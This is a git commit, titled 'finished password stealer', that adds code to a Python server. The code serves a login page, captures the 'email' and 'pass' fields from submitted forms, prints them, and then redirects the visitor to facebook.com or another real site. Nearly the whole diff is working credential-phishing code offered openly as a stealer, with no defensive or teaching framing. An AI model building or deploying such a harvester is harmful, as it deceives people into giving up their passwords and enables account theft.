c5145677877a1eca0ea3823c348480723cce8845
Kasama <ralegro@bol.com.br>
2016-04-15 12:09:28 -0300

    finished password stealer

--- server.py
+++ server.py
@@ -1,4 +1,11 @@
 import SocketServer
+import BaseHTTPServer
+import sys
+import cgi
+from cgi import parse_header, parse_multipart
+
+REDIRECTIONS = {"/slashdot/": "http://slashdot.org/"}
+LAST_RESORT = "http://facebook.com"
 
 class MyTCPHandler(SocketServer.BaseRequestHandler):
 
@@ -12,9 +19,39 @@ class MyTCPHandler(SocketServer.BaseRequestHandler):
         text = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/\nContent-Type: text/html\nContent-Length: 174\n<html>\n<head>\n<title>Moved</title>\n</head>\n<body>\n<h1>Moved</h1>\n<p>This page has moved to <a href=\"http://www.example.org/\">http://www.example.org/</a>.</p>\n</body>\n</html>"
         self.request.sendall(text)
 
+class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_HEAD(s):
+        s.send_response(301)
+        s.send_header("Location", REDIRECTIONS.get(s.path, LAST_RESORT))
+        s.end_headers()
+    def do_GET(s):
+        page = open("index.html")
+        txt = page.read()
+        s.send_response(200)
+        s.send_header("Content-type", "text/html")
+        s.end_headers()
+        s.wfile.write(txt)
+    def do_POST(s):
+        ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
+        if ctype == 'multipart/form-data':
+            postvars = cgi.parse_multipart(s.rfile, pdict)
+        elif ctype == 'application/x-www-form-urlencoded':
+            length = int(s.headers.getheader('content-length'))
+            postvars = cgi.parse_qs(s.rfile.read(length), keep_blank_values=1)
+        else:
+            postvars = {}
+        mail = postvars['email']
+        password = postvars['pass']
+        print(mail)
+        print(password)
+        s.do_HEAD()
+
 if __name__ == "__main__":
     HOST, PORT = 'localhost', 8000
-
-    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
-
-    server.serve_forever()
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST, PORT), RedirectHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
